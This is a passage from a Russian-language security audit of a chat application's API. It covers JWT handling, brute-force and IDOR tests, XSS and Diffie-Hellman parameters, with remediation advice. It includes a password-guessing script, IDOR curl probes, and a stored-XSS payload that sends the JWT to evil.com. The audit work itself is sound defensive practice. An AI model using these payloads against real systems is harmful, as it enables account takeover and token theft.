### 4.2 Аутентификация и управление сессиями

#### Проверка JWT токенов

**Тестовые векторы**:

1. Отсутствие токена
2. Невалидный токен
3. Истекший токен
4. Токен с измененным payload
5. Токен с отсутствующей подписью

**Найденные проблемы**:

| ID      | Проблема                     | Серьезность    | Описание                  | Рекомендация                          |
| ------- | ---------------------------- | -------------- | ------------------------- | ------------------------------------- |
| AUTH-01 | Хранение JWT в localStorage  | 🟡 СРЕДНЯЯ     | Уязвимо к XSS-атакам      | Использовать HttpOnly cookies         |
| AUTH-02 | Длительный срок жизни токена | 🟡 СРЕДНЯЯ     | Access token > 1 час      | Сократить до 15 минут + refresh token |
| AUTH-03 | Отсутствие rate limiting     | 🔴 КРИТИЧЕСКАЯ | Возможен брутфорс         | Внедрить 5 попыток / 15 мин           |
| AUTH-04 | Слабая политика паролей      | 🟡 СРЕДНЯЯ     | Минимальные требования    | Минимум 8 символов, сложность         |
| AUTH-05 | Нет блокировки аккаунта      | 🔴 ВЫСОКАЯ     | После N неудачных попыток | Блокировка на 30 минут                |

**Тест: Брутфорс-атака на /auth/login**

```python
# Тестовый скрипт
import requests
import time

API_URL = "http://localhost:3001/auth/login"
passwords = ["password", "123456", "qwerty", "admin"]

for password in passwords:
    response = requests.post(API_URL, json={
        "username": "testuser",
        "password": password
    })
    print(f"Password: {password} - Status: {response.status_code}")
    # НЕТ задержки между запросами = УЯЗВИМОСТЬ
```

**Результат**: ❌ Отсутствует rate limiting - можно отправить 1000+ запросов без блокировки

### 4.3 Контроль доступа (Authorization)

#### IDOR (Insecure Direct Object Reference)

**Тестовые сценарии**:

```bash
# Пользователь A (ID=1, JWT_A)
# Пользователь B (ID=2, JWT_B)

# 1. Попытка доступа к чужому профилю
curl -H "Authorization: Bearer JWT_A" \
     http://localhost:3001/users/2

# 2. Попытка чтения чужих сообщений
curl -H "Authorization: Bearer JWT_A" \
     http://localhost:3001/messages?chatId=999

# 3. Попытка удаления чужого чата
curl -X DELETE \
     -H "Authorization: Bearer JWT_A" \
     http://localhost:3001/chats/999
```

| Endpoint                 | Ожидается     | Фактически          | Статус |
| ------------------------ | ------------- | ------------------- | ------ |
| `GET /users/:id`         | 403 Forbidden | ❓ Требует проверки | ⚠️     |
| `GET /messages?chatId=X` | 403 Forbidden | ❓ Требует проверки | ⚠️     |
| `DELETE /chats/:id`      | 403 Forbidden | ❓ Требует проверки | ⚠️     |
| `PUT /users/:id`         | 403 Forbidden | ❓ Требует проверки | ⚠️     |

**Необходимо проверить**:

- ❌ Валидируется ли `userId` из JWT с `userId` из параметров?
- ❌ Есть ли проверка владельца ресурса (chat, message)?
- ❌ Можно ли изменить чужой профиль?

### 4.4 Защита от XSS (Cross-Site Scripting)

#### Потенциальные векторы атаки

**Stored XSS (в сообщениях чата)**:

```javascript
// Злонамеренное сообщение
{
  "chatId": 1,
  "content": "<script>fetch('https://evil.com/steal?token=' + localStorage.getItem('jwt'))</script>"
}
```

**Reflected XSS (в параметрах поиска)**:

```
GET /users/search?query=<script>alert('XSS')</script>
```

| Место ввода      | Санитизация   | Статус              | Риск       |
| ---------------- | ------------- | ------------------- | ---------- |
| Сообщения в чате | ❓ Неизвестно | ⚠️ Требует проверки | 🔴 ВЫСОКИЙ |

| Bio/Описание     | ❓ Неизвестно | ⚠️ Требует проверки | 🟡 СРЕДНИЙ |
| Название чата    | ❓ Неизвестно | ⚠️ Требует проверки | 🟡 СРЕДНИЙ |

**Рекомендации**:

- ✅ Использовать DOMPurify на клиенте
- ✅ Санитизация на сервере (sanitize-html)
- ✅ Content Security Policy (CSP) заголовки

### 4.6 Криптография (Diffie-Hellman)

#### Анализ параметров DH

**Проверяемые аспекты**:

| Параметр          | Минимум     | Рекомендуется        | Статус              |
| ----------------- | ----------- | -------------------- | ------------------- |
| Простое число `p` | 2048 бит    | 3072-4096 бит        | ❓ Требует проверки |
| Генератор `g`     | 2 или 5     | Проверенные значения | ❓ Требует проверки |
| Приватный ключ    | 256 бит     | 384 бит              | ❓ Требует проверки |
| PRNG              | Crypto-safe | Web Crypto API       | ❓ Требует проверки |

**Потенциальные уязвимости**:

1. **Слабые параметры DH**
   - Использование p < 2048 бит
   - Небезопасные значения g

2. **Man-in-the-Middle (MITM)**
   - Отсутствие аутентификации обмена ключами
   - Нет механизма проверки подлинности

3. **Небезопасное хранение ключей**
   - Приватные ключи в localStorage (доступны для XSS)
   - Отправка приватного ключа на сервер

**Рекомендации**:

- ✅ Использовать Web Crypto API для генерации ключей
- ✅ Хранить приватные ключи только в памяти (не localStorage)
- ✅ Реализовать authenticated DH (с цифровыми подписями)
- ✅ Perfect Forward Secrecy (регенерация ключей)
